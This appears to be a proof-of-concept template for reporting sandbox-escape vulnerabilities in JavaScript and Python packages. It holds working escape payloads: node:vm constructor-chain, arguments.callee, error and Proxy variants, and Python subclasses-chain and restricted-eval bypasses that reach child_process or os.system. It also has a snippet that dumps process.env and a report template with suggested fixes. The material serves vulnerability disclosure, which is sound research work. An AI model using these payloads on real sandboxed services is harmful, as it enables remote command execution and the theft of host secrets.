# PoC Skeleton -- Sandbox Escape

## node:vm Constructor Chain Escape

```js
/**
 * CVE-CANDIDATE: Sandbox Escape in [package-name] [version]
 * CWE: CWE-94 (Code Injection) / CWE-265 (Privilege Issues)
 * CVSS: 9.9 CRITICAL (AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H)
 */
const pkg = require('[package-name]');

// Step 1: Escape the sandbox via constructor chain
const escapePayload = `
  const process = this.constructor.constructor('return this.process')();
  const result = process.mainModule.require('child_process').execSync('id');
  result.toString();
`;

// Step 2: Execute through the vulnerable function
const result = pkg.evaluate(escapePayload);
console.log('[+] Sandbox escaped! RCE result:', result);
```

## node:vm Alternative Escapes

### Via arguments.callee (if in function context)
```js
const payload = `
  arguments.callee.caller.constructor('return process')().mainModule
    .require('child_process').execSync('id').toString()
`;
```

### Via Error Stack
```js
const payload = `
  try { null.f() } catch(e) {
    // Error stack may leak references to outer scope
    e.constructor.constructor('return process')()
  }
`;
```

### Via Proxy (if available)
```js
const payload = `
  new Proxy({}, {
    get: function(t, p) {
      return this.constructor.constructor('return process')();
    }
  }).anything
`;
```

## Python simpleeval Escape

```python
#!/usr/bin/env python3
"""
CVE-CANDIDATE: Sandbox Escape in [package-name]
CWE: CWE-94
CVSS: 9.8 CRITICAL
"""
from [package] import evaluate

# Escape via class hierarchy
payload = "().__class__.__base__.__subclasses__()[INDEX].__init__.__globals__"

# First, find the right subclass index (os._wrap_close or similar)
# Then: payload + "['os'].system('id')"

result = evaluate(payload)
print(f"[+] Sandbox escaped: {result}")
```

## Python eval Restriction Bypass

```python
# Even with __builtins__ = {} (restricted builtins):
payload = "[c for c in ().__class__.__base__.__subclasses__() if c.__name__ == 'catch_warnings'][0]()._module.__builtins__['__import__']('os').system('id')"
```

## Evidence Collection

```js
// Non-destructive proof of sandbox escape:
// 1. Access process object (proves escape from vm)
const proof1 = 'this.constructor.constructor("return process.version")()';
// Expected: v18.x.x (or whatever Node version)

// 2. Read environment (proves host access)
const proof2 = 'this.constructor.constructor("return JSON.stringify(process.env)")()';

// 3. Execute command (proves RCE)
const proof3 = 'this.constructor.constructor("return process")().mainModule.require("child_process").execSync("id").toString()';
```

## Reporting Template

```
## Vulnerability: Sandbox Escape in [package]

**File**: `src/[file].js:LINE`
**Sandbox**: `vm.runInNewContext()` at line LINE
**Escape**: Constructor chain via `this.constructor.constructor()`
**Impact**: Remote Code Execution -- attacker escapes sandbox to execute
arbitrary commands on the host system

### Root Cause
The package uses node:vm for security isolation, but node:vm is explicitly
documented as NOT a security mechanism. The constructor chain provides
direct access to the host process object.

### Reproduction
1. Install: `npm install [package]@[version]`
2. Run: `node poc.js`
3. Observe: `id` command output from host system

### Suggested Fix
- Replace node:vm with `isolated-vm` (separate V8 isolate)
- Or use `quickjs-emscripten` for WebAssembly-based isolation
- Or parse input into AST and validate against allowlist before execution
```
